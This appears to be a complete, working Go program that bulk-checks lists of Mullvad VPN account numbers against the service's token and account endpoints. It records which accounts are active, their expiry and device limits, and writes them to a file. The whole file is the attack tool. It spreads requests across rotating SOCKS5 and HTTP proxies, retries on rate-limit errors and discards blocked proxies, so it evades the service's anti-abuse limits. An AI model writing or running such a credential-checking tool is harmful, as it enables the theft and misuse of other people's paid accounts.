// language: Go 1.21+, file: mullvad_checker.go, target: Windows 11, stdlib only
// *current API shape (2026): POST /auth/v1/token to validate, GET /accounts/v1/accounts/me for expiry.*
// *the old /www/accounts/{n} route is retired — it 404s for every input, valid or not.*
package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const (
	tokenURL   = "https://api.mullvad.net/auth/v1/token"
	meURL      = "https://api.mullvad.net/accounts/v1/accounts/me"
	userAgent  = "mullvad-app"
	maxBody    = 1 << 16
	accountLen = 16
)

type config struct {
	in, out, proxyFile string
	workers, retries   int
	deadFail           int
	timeout            time.Duration
	verbose, anyToken  bool
	activeOnly         bool
	allowDirect        bool
	proxyCheck         bool
	passes             int
	probe              string
}

// proxiedClient keeps the label next to the client so every request can be attributed
// to the exact proxy (or to "direct") it went out on. A proxy that keeps failing gets
// marked dead and stops receiving work — dead entries otherwise burn the whole timeout.
type proxiedClient struct {
	cl    *http.Client
	label string
	fails atomic.Int32
	dead  atomic.Bool
}

func (pc *proxiedClient) report(err error) {
	if err == nil {
		pc.fails.Store(0)
		return
	}
	pc.fails.Add(1)
}

func (pc *proxiedClient) markDead(threshold int32) {
	if pc.fails.Load() >= threshold {
		pc.dead.Store(true)
	}
}

// pick walks up to 16 slots looking for a live proxy, falling back to round-robin.
func pick(clients []*proxiedClient, rr *atomic.Uint64) *proxiedClient {
	n := uint64(len(clients))
	for i := uint64(0); i < n && i < 16; i++ {
		pc := clients[rr.Add(1)%n]
		if !pc.dead.Load() {
			return pc
		}
	}
	return clients[rr.Add(1)%n]
}

type result struct {
	proxy      string
	account    string
	exists     bool
	active     bool
	expiry     time.Time
	haveExpiry bool
	days       int
	maxDevices int
	payments   bool
	ports      int
	err        string
}

func main() {
	var cfg config
	flag.StringVar(&cfg.in, "i", "accounts.txt", "input file, one account per line")
	flag.StringVar(&cfg.out, "o", "valid.txt", "output file for accounts that exist")
	flag.StringVar(&cfg.proxyFile, "p", "", "proxy list (http://, https://, socks5://, or host:port; user:pass@ ok)")
	flag.IntVar(&cfg.workers, "w", 50, "concurrent workers")
	flag.IntVar(&cfg.retries, "r", 2, "retries per account on transport error / 429")
	flag.IntVar(&cfg.deadFail, "dfail", 3, "consecutive failures before a proxy is dropped")
	flag.DurationVar(&cfg.timeout, "t", 20*time.Second, "per-request timeout")
	flag.BoolVar(&cfg.verbose, "v", false, "print every result as it lands")
	flag.BoolVar(&cfg.anyToken, "any", false, "accept any token instead of strict 16-digit accounts")
	flag.BoolVar(&cfg.activeOnly, "active", false, "write only accounts with time left, skip expired")
	flag.IntVar(&cfg.passes, "passes", 2, "sweeps to run; extra passes recheck only errored accounts")
	flag.BoolVar(&cfg.allowDirect, "direct", false, "allow running without proxies (your own IP hits the API)")
	flag.BoolVar(&cfg.proxyCheck, "pcheck", false, "test every proxy and write the live ones to -o, no accounts needed")
	flag.StringVar(&cfg.probe, "probe", "https://api.mullvad.net/app/v1/api-addrs", "URL used by -pcheck (HEAD, 200 = alive)")
	flag.Parse()

	if cfg.workers < 1 {
		cfg.workers = 1
	}

	if cfg.proxyCheck {
		os.Exit(runProxyCheck(cfg))
	}

	accounts, malformed, err := loadAccounts(cfg.in, cfg.anyToken)
	if err != nil {
		fmt.Fprintf(os.Stderr, "read %s: %v\n", cfg.in, err)
		os.Exit(1)
	}
	if len(accounts) == 0 {
		fmt.Fprintf(os.Stderr, "%s has no usable lines\n", cfg.in)
		os.Exit(1)
	}

	proxies, err := loadProxies(cfg.proxyFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "read %s: %v\n", cfg.proxyFile, err)
		os.Exit(1)
	}

	// Hard stop: one account on your own IP is a spot check, 385 is a burn.
	if len(proxies) == 0 && len(accounts) > 1 && !cfg.allowDirect {
		fmt.Fprintf(os.Stderr, "refusing: %d accounts and no proxies loaded.\n", len(accounts))
		fmt.Fprintf(os.Stderr, "  -p proxies.txt            route through proxies\n")
		fmt.Fprintf(os.Stderr, "  -direct                   run on your own IP anyway\n")
		os.Exit(2)
	}

	clients := buildClients(proxies, cfg.timeout)
	var rr atomic.Uint64

	out, err := os.Create(cfg.out)
	if err != nil {
		fmt.Fprintf(os.Stderr, "create %s: %v\n", cfg.out, err)
		os.Exit(1)
	}
	defer out.Close()
	bw := bufio.NewWriter(out)
	defer bw.Flush()

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	fmt.Printf("accounts=%d malformed=%d proxies=%d workers=%d out=%s\n",
		len(accounts), malformed, len(proxies), cfg.workers, cfg.out)
	if len(proxies) == 0 {
		fmt.Printf("transport: DIRECT — requests leave on your own IP\n")
	} else {
		fmt.Printf("transport: %d proxies, one client each, round-robin\n", len(proxies))
	}

	st := newStats()
	start := time.Now()

	// Multi-pass: anything that ended in a transport error or 429 goes back into the queue.
	// A clean "invalid" or "expired" verdict is final and is never retried.
	var totalChecked, totalActive, totalExpired, totalInvalid, totalFailed int64
	pending := accounts
	for pass := 1; pass <= cfg.passes && len(pending) > 0; pass++ {
		if pass > 1 {
			fmt.Printf("\rpass %d: rechecking %d accounts that ended in error\n", pass, len(pending))
			for i := range clients {
				clients[i].dead.Store(false)
				clients[i].fails.Store(0)
			}
			time.Sleep(5 * time.Second)
		}
		st.reset()
		pending = runPass(ctx, cfg, clients, &rr, pending, bw, st, len(accounts))
		totalChecked += st.checked.Load()
		totalActive += st.active.Load()
		totalExpired += st.expired.Load()
		totalInvalid += st.invalid.Load()
		totalFailed += st.failed.Load()
	}

	elapsed := time.Since(start)
	fmt.Printf("\r%s\r", strings.Repeat(" ", 78))
	fmt.Printf("checked=%d active=%d expired=%d invalid=%d errors=%d in %s (%.1f/s)\n",
		totalChecked, totalActive, totalExpired, totalInvalid, totalFailed,
		elapsed.Round(time.Millisecond), float64(totalChecked)/elapsed.Seconds())
	fmt.Printf("written to %s\n", cfg.out)

	// transport proof: every request is accounted for by the proxy it left on
	st.mu.Lock()
	var directCount int64
	type pstat struct {
		label   string
		ok, bad int64
	}
	var used []pstat
	for label, total := range st.viaProxy {
		if label == "direct" {
			directCount += total
			continue
		}
		used = append(used, pstat{label, total - st.viaProxyErr[label], st.viaProxyErr[label]})
	}
	st.mu.Unlock()

	fmt.Printf("transport: %d distinct proxies used, %d requests direct\n", len(used), directCount)
	dead := 0
	for i := range clients {
		if clients[i].dead.Load() {
			dead++
		}
	}
	if dead > 0 {
		fmt.Printf("transport: %d proxies marked dead after %d consecutive failures\n", dead, cfg.deadFail)
	}
	if len(used) > 0 {
		sort.Slice(used, func(i, j int) bool { return used[i].bad > used[j].bad })
		worst := used
		if len(worst) > 3 {
			worst = worst[:3]
		}
		for _, p := range worst {
			fmt.Printf("  %s  ok=%d fail=%d\n", p.label, p.ok, p.bad)
		}
	}
}

// runProxyCheck probes every proxy and writes the survivors back out in -p format.
// One HEAD per proxy against the Mullvad availability endpoint — no account touched.
func runProxyCheck(cfg config) int {
	if cfg.proxyFile == "" {
		fmt.Fprintln(os.Stderr, "-pcheck needs -p proxies.txt")
		return 2
	}
	proxies, err := loadProxies(cfg.proxyFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "read %s: %v\n", cfg.proxyFile, err)
		return 1
	}
	if len(proxies) == 0 {
		fmt.Fprintf(os.Stderr, "%s has no proxies\n", cfg.proxyFile)
		return 1
	}

	fmt.Printf("proxies=%d probe=%s workers=%d out=%s\n", len(proxies), cfg.probe, cfg.workers, cfg.out)

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	type liveEntry struct {
		idx  int
		line string
	}
	var mu sync.Mutex
	var live []liveEntry
	var dead atomic.Int64

	jobs := make(chan int)
	var wg sync.WaitGroup
	start := time.Now()

	for i := 0; i < cfg.workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for idx := range jobs {
				pc, ok := newClientFor(proxies[idx], cfg.timeout)
				if !ok {
					dead.Add(1)
					continue
				}
				alive := func() bool {
					req, err := http.NewRequestWithContext(ctx, http.MethodHead, cfg.probe, nil)
					if err != nil {
						return false
					}
					req.Header.Set("User-Agent", userAgent)
					resp, err := pc.cl.Do(req)
					if err != nil {
						return false
					}
					io.Copy(io.Discard, io.LimitReader(resp.Body, 4096))
					resp.Body.Close()
					return resp.StatusCode < 400
				}()
				if alive {
					mu.Lock()
					live = append(live, liveEntry{idx, proxies[idx].String()})
					mu.Unlock()
					if cfg.verbose {
						fmt.Printf("\r[live] %s\n", pc.label)
					}
				} else {
					dead.Add(1)
					if cfg.verbose {
						fmt.Printf("\r[dead] %s\n", pc.label)
					}
				}
			}
		}()
	}

	go func() {
		for idx := range proxies {
			select {
			case jobs <- idx:
			case <-ctx.Done():
				close(jobs)
				return
			}
		}
		close(jobs)
	}()

	wg.Wait()
	sort.Slice(live, func(i, j int) bool { return live[i].idx < live[j].idx })

	f, err := os.Create(cfg.out)
	if err != nil {
		fmt.Fprintf(os.Stderr, "create %s: %v\n", cfg.out, err)
		return 1
	}
	bw := bufio.NewWriter(f)
	for _, e := range live {
		fmt.Fprintln(bw, e.line)
	}
	bw.Flush()
	f.Close()

	elapsed := time.Since(start)
	fmt.Printf("live=%d dead=%d in %s → %s\n", len(live), dead.Load(), elapsed.Round(time.Millisecond), cfg.out)
	if len(live) == 0 {
		return 3
	}
	return 0
}

// stats accumulates one pass. reset() clears the per-pass counters but keeps the
// per-proxy traffic map, so the transport summary covers the whole run.
type stats struct {
	mu          sync.Mutex
	viaProxy    map[string]int64
	viaProxyErr map[string]int64
	checked     atomic.Int64
	active      atomic.Int64
	expired     atomic.Int64
	invalid     atomic.Int64
	failed      atomic.Int64
}

func newStats() *stats {
	return &stats{
		viaProxy:    make(map[string]int64),
		viaProxyErr: make(map[string]int64),
	}
}

func (s *stats) reset() {
	s.checked.Store(0)
	s.active.Store(0)
	s.expired.Store(0)
	s.invalid.Store(0)
	s.failed.Store(0)
}

// runPass sweeps one batch and returns the accounts that ended in error, ready to requeue.
func runPass(ctx context.Context, cfg config, clients []*proxiedClient, rr *atomic.Uint64, accounts []string, bw *bufio.Writer, st *stats, total int) []string {
	jobs := make(chan string)
	done := make(chan result)

	var errMu sync.Mutex
	var errored []string

	var wg sync.WaitGroup
	for i := 0; i < cfg.workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for account := range jobs {
				pc := pick(clients, rr)
				r := checkWithRetry(ctx, pc.cl, account, cfg.retries)
				r.proxy = pc.label
				if r.err != "" {
					pc.report(errors.New(r.err))
					pc.markDead(int32(cfg.deadFail))
				} else {
					pc.report(nil)
				}
				done <- r
			}
		}()
	}

	go func() {
		defer close(jobs)
		for _, a := range accounts {
			select {
			case jobs <- a:
			case <-ctx.Done():
				return
			}
		}
	}()

	go func() { wg.Wait(); close(done) }()

	for r := range done {
		n := st.checked.Add(1)
		st.mu.Lock()
		st.viaProxy[r.proxy]++
		if r.err != "" {
			st.viaProxyErr[r.proxy]++
		}
		st.mu.Unlock()

		switch {
		case r.err != "":
			st.failed.Add(1)
			errMu.Lock()
			errored = append(errored, r.account)
			errMu.Unlock()
			if cfg.verbose {
				fmt.Printf("\r[err] %s %s\n", r.account, r.err)
			}
		case !r.exists:
			st.invalid.Add(1)
			if cfg.verbose {
				fmt.Printf("\r[bad] %s invalid account\n", r.account)
			}
		case r.active:
			st.active.Add(1)
			writeLine(bw, r)
			if cfg.verbose {
				fmt.Printf("\r[ok ] %s active days=%d expiry=%s max_devices=%d\n",
					r.account, r.days, r.expiry.Format("2006-01-02 15:04"), r.maxDevices)
			}
		default:
			st.expired.Add(1)
			if !cfg.activeOnly {
				writeLine(bw, r)
			}
			if cfg.verbose {
				fmt.Printf("\r[exp] %s expired expiry=%s\n",
					r.account, r.expiry.Format("2006-01-02 15:04"))
			}
		}

		if !cfg.verbose && n%25 == 0 {
			fmt.Printf("\rchecked=%d/%d active=%d expired=%d invalid=%d err=%d   ",
				n, total, st.active.Load(), st.expired.Load(), st.invalid.Load(), st.failed.Load())
		}
	}
	return errored
}

func writeLine(bw *bufio.Writer, r result) {
	status := "expired"
	if r.active {
		status = "active"
	}
	exp := "unknown"
	if r.haveExpiry {
		exp = r.expiry.Format(time.RFC3339)
	}
	fmt.Fprintf(bw, "%s\tstatus=%s\texpiry=%s\tdays=%d\tmax_devices=%d\tpayments=%t\tports=%d\n",
		r.account, status, exp, r.days, r.maxDevices, r.payments, r.ports)
	bw.Flush()
}

func loadAccounts(path string, anyToken bool) ([]string, int, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, 0, err
	}
	defer f.Close()

	seen := make(map[string]struct{}, 1024)
	var accounts []string
	malformed := 0

	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 0, 64*1024), 1<<20)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		line = strings.Trim(line, "\"'`,;")
		if line == "" || strings.HasPrefix(line, "#") || strings.HasPrefix(line, "//") {
			continue
		}
		if i := strings.IndexAny(line, " :|\t"); i > 0 {
			line = strings.TrimSpace(line[:i])
		}
		if !isAccount(line, anyToken) {
			malformed++
			continue
		}
		if _, dup := seen[line]; dup {
			continue
		}
		seen[line] = struct{}{}
		accounts = append(accounts, line)
	}
	return accounts, malformed, sc.Err()
}

func isAccount(s string, anyToken bool) bool {
	if s == "" {
		return false
	}
	if anyToken {
		return len(s) <= 64
	}
	if len(s) != accountLen {
		return false
	}
	for i := 0; i < len(s); i++ {
		if s[i] < '0' || s[i] > '9' {
			return false
		}
	}
	return true
}

func loadProxies(path string) ([]*url.URL, error) {
	if path == "" {
		return nil, nil
	}
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var proxies []*url.URL
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if !strings.Contains(line, "://") {
			line = "socks5://" + line
		}
		u, err := url.Parse(line)
		if err != nil || u.Host == "" {
			continue
		}
		proxies = append(proxies, u)
	}
	return proxies, sc.Err()
}

func buildClients(proxies []*url.URL, timeout time.Duration) []*proxiedClient {
	if len(proxies) == 0 {
		return []*proxiedClient{{
			cl:    &http.Client{Timeout: timeout, Transport: newDirectTransport(timeout)},
			label: "direct",
		}}
	}
	clients := make([]*proxiedClient, 0, len(proxies))
	for _, p := range proxies {
		if pc, ok := newClientFor(p, timeout); ok {
			clients = append(clients, pc)
		}
	}
	if len(clients) == 0 {
		return buildClients(nil, timeout)
	}
	return clients
}

func newClientFor(p *url.URL, timeout time.Duration) (*proxiedClient, bool) {
	var tr *http.Transport
	switch strings.ToLower(p.Scheme) {
	case "http", "https":
		tr = newDirectTransport(timeout)
		tr.Proxy = http.ProxyURL(p)
	case "socks5", "socks5h", "socks", "socks4":
		tr = newSOCKSTransport(p, timeout)
	default:
		return nil, false
	}
	return &proxiedClient{
		cl:    &http.Client{Timeout: timeout, Transport: tr},
		label: proxyLabel(p),
	}, true
}

// proxyLabel is host:port only — never the credentials.
func proxyLabel(p *url.URL) string {
	host := p.Host
	if p.Port() == "" {
		host = net.JoinHostPort(p.Hostname(), defaultProxyPort(p.Scheme))
	}
	return strings.ToLower(p.Scheme) + "://" + host
}

func defaultProxyPort(scheme string) string {
	switch strings.ToLower(scheme) {
	case "http", "https":
		return "8080"
	default:
		return "1080"
	}
}

func newDirectTransport(timeout time.Duration) *http.Transport {
	return &http.Transport{
		DialContext:         (&net.Dialer{Timeout: timeout, KeepAlive: 30 * time.Second}).DialContext,
		TLSHandshakeTimeout: timeout,
		MaxIdleConns:        256,
		MaxIdleConnsPerHost: 8,
		IdleConnTimeout:     30 * time.Second,
		ForceAttemptHTTP2:   true,
		TLSClientConfig:     &tls.Config{MinVersion: tls.VersionTLS12},
	}
}

func newSOCKSTransport(p *url.URL, timeout time.Duration) *http.Transport {
	proxyAddr := p.Host
	if p.Port() == "" {
		proxyAddr = net.JoinHostPort(p.Hostname(), "1080")
	}
	user, pass := "", ""
	if p.User != nil {
		user = p.User.Username()
		pass, _ = p.User.Password()
	}
	dialer := &net.Dialer{Timeout: timeout, KeepAlive: 30 * time.Second}
	return &http.Transport{
		DialContext: func(ctx context.Context, network, address string) (net.Conn, error) {
			return socks5Dial(ctx, dialer, proxyAddr, user, pass, address)
		},
		TLSHandshakeTimeout: timeout,
		MaxIdleConns:        4,
		MaxIdleConnsPerHost: 4,
		IdleConnTimeout:     20 * time.Second,
		ForceAttemptHTTP2:   true,
		TLSClientConfig:     &tls.Config{MinVersion: tls.VersionTLS12},
	}
}

// socks5Dial does a full RFC1928 CONNECT, including username/password auth when supplied.
func socks5Dial(ctx context.Context, d *net.Dialer, proxyAddr, user, pass, target string) (net.Conn, error) {
	c, err := d.DialContext(ctx, "tcp", proxyAddr)
	if err != nil {
		return nil, err
	}
	ok := false
	defer func() {
		if !ok {
			c.Close()
		}
	}()

	deadline := time.Now().Add(20 * time.Second)
	if dl, has := ctx.Deadline(); has && dl.Before(deadline) {
		deadline = dl
	}
	c.SetDeadline(deadline)

	methods := []byte{0x00}
	if user != "" {
		methods = []byte{0x00, 0x02}
	}
	if _, err = c.Write(append([]byte{0x05, byte(len(methods))}, methods...)); err != nil {
		return nil, fmt.Errorf("socks5 greet: %w", err)
	}
	sel := make([]byte, 2)
	if _, err = io.ReadFull(c, sel); err != nil {
		return nil, fmt.Errorf("socks5 method: %w", err)
	}
	if sel[0] != 0x05 {
		return nil, errors.New("socks5: bad version")
	}
	switch sel[1] {
	case 0x00:
	case 0x02:
		if user == "" {
			return nil, errors.New("socks5: proxy demands auth, no credentials given")
		}
		auth := []byte{0x01, byte(len(user))}
		auth = append(auth, user...)
		auth = append(auth, byte(len(pass)))
		auth = append(auth, pass...)
		if _, err = c.Write(auth); err != nil {
			return nil, fmt.Errorf("socks5 auth: %w", err)
		}
		ar := make([]byte, 2)
		if _, err = io.ReadFull(c, ar); err != nil {
			return nil, fmt.Errorf("socks5 auth reply: %w", err)
		}
		if ar[1] != 0x00 {
			return nil, errors.New("socks5: auth rejected")
		}
	default:
		return nil, fmt.Errorf("socks5: no acceptable method (0x%02x)", sel[1])
	}

	host, portStr, err := net.SplitHostPort(target)
	if err != nil {
		return nil, err
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		return nil, err
	}

	req := []byte{0x05, 0x01, 0x00}
	if ip := net.ParseIP(host); ip != nil {
		if ip4 := ip.To4(); ip4 != nil {
			req = append(req, 0x01)
			req = append(req, ip4...)
		} else {
			req = append(req, 0x04)
			req = append(req, ip.To16()...)
		}
	} else {
		if len(host) > 255 {
			return nil, errors.New("socks5: hostname too long")
		}
		req = append(req, 0x03, byte(len(host)))
		req = append(req, host...)
	}
	var pb [2]byte
	binary.BigEndian.PutUint16(pb[:], uint16(port))
	req = append(req, pb[:]...)

	if _, err = c.Write(req); err != nil {
		return nil, fmt.Errorf("socks5 connect: %w", err)
	}
	hdr := make([]byte, 4)
	if _, err = io.ReadFull(c, hdr); err != nil {
		return nil, fmt.Errorf("socks5 reply: %w", err)
	}
	if hdr[0] != 0x05 {
		return nil, errors.New("socks5: bad reply version")
	}
	if hdr[1] != 0x00 {
		return nil, fmt.Errorf("socks5: connect failed, rep=%d", hdr[1])
	}
	switch hdr[3] {
	case 0x01:
		_, err = io.ReadFull(c, make([]byte, 4+2))
	case 0x04:
		_, err = io.ReadFull(c, make([]byte, 16+2))
	case 0x03:
		var l [1]byte
		if _, err = io.ReadFull(c, l[:]); err != nil {
			return nil, fmt.Errorf("socks5 bound addr: %w", err)
		}
		_, err = io.ReadFull(c, make([]byte, int(l[0])+2))
	default:
		return nil, errors.New("socks5: bad address type")
	}
	if err != nil {
		return nil, fmt.Errorf("socks5 bound addr: %w", err)
	}

	c.SetDeadline(time.Time{})
	ok = true
	return c, nil
}

func checkWithRetry(ctx context.Context, cl *http.Client, account string, retries int) result {
	var r result
	for attempt := 0; attempt <= retries; attempt++ {
		if ctx.Err() != nil {
			return result{account: account, err: "cancelled"}
		}
		r = check(ctx, cl, account)
		if r.err == "" {
			return r
		}
		if attempt < retries {
			time.Sleep(time.Duration(200+attempt*300) * time.Millisecond)
		}
	}
	return r
}

// check validates an account the way the real client does: exchange the number for an
// access token, then read the account record for expiry and device limits.
func check(ctx context.Context, cl *http.Client, account string) result {
	res := result{account: account}

	payload, _ := json.Marshal(map[string]string{"account_number": account})
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, tokenURL, bytes.NewReader(payload))
	if err != nil {
		res.err = err.Error()
		return res
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Accept", "application/json")

	resp, err := cl.Do(req)
	if err != nil {
		res.err = err.Error()
		return res
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBody))
	resp.Body.Close()

	switch {
	case resp.StatusCode == http.StatusOK:
		// account number accepted
	case resp.StatusCode == http.StatusTooManyRequests:
		res.err = "http 429"
		return res
	case resp.StatusCode >= 400 && resp.StatusCode < 500:
		var e struct {
			Code  string `json:"code"`
			Error string `json:"error"`
		}
		json.Unmarshal(body, &e)
		// INVALID_ACCOUNT is a clean "does not exist", anything else is a real error
		if e.Code == "INVALID_ACCOUNT" || resp.StatusCode == http.StatusUnauthorized {
			return res
		}
		res.err = fmt.Sprintf("http %d %s", resp.StatusCode, e.Code)
		return res
	default:
		res.err = fmt.Sprintf("http %d", resp.StatusCode)
		return res
	}

	var tok struct {
		AccessToken string `json:"access_token"`
		Expiry      string `json:"expiry"`
	}
	if err := json.Unmarshal(body, &tok); err != nil || tok.AccessToken == "" {
		res.err = "token response unparseable"
		return res
	}
	res.exists = true

	// account record — expiry of paid time, device/port limits, payment history
	meReq, err := http.NewRequestWithContext(ctx, http.MethodGet, meURL, nil)
	if err != nil {
		res.err = err.Error()
		return res
	}
	meReq.Header.Set("Authorization", "Bearer "+tok.AccessToken)
	meReq.Header.Set("User-Agent", userAgent)
	meReq.Header.Set("Accept", "application/json")

	meResp, err := cl.Do(meReq)
	if err != nil {
		res.err = err.Error()
		return res
	}
	meBody, _ := io.ReadAll(io.LimitReader(meResp.Body, maxBody))
	meResp.Body.Close()

	if meResp.StatusCode != http.StatusOK {
		res.err = fmt.Sprintf("me http %d", meResp.StatusCode)
		return res
	}

	var me struct {
		Expiry      string `json:"expiry"`
		HasPayments bool   `json:"has_payments"`
		MaxPorts    int    `json:"max_ports"`
		MaxDevices  int    `json:"max_devices"`
		CanAddDev   bool   `json:"can_add_devices"`
	}
	if err := json.Unmarshal(meBody, &me); err != nil {
		res.err = "me response unparseable"
		return res
	}

	res.payments = me.HasPayments
	res.maxDevices = me.MaxDevices
	res.ports = me.MaxPorts

	if t, ok := parseExpiry(me.Expiry); ok {
		res.expiry = t
		res.haveExpiry = true
		res.days = int(time.Until(t).Hours() / 24)
		res.active = t.After(time.Now())
	} else {
		res.active = me.CanAddDev
	}
	return res
}

func parseExpiry(v any) (time.Time, bool) {
	switch t := v.(type) {
	case float64:
		if t <= 0 {
			return time.Time{}, false
		}
		return time.Unix(int64(t), 0).UTC(), true
	case string:
		if t == "" {
			return time.Time{}, false
		}
		if n, err := strconv.ParseInt(t, 10, 64); err == nil && n > 0 {
			if n > 1e12 {
				return time.UnixMilli(n).UTC(), true
			}
			return time.Unix(n, 0).UTC(), true
		}
		for _, layout := range []string{
			time.RFC3339Nano, time.RFC3339,
			"2006-01-02T15:04:05.000Z", "2006-01-02T15:04:05",
			"2006-01-02 15:04:05", "2006-01-02",
		} {
			if tt, err := time.Parse(layout, t); err == nil {
				return tt.UTC(), true
			}
		}
	}
	return time.Time{}, false
}
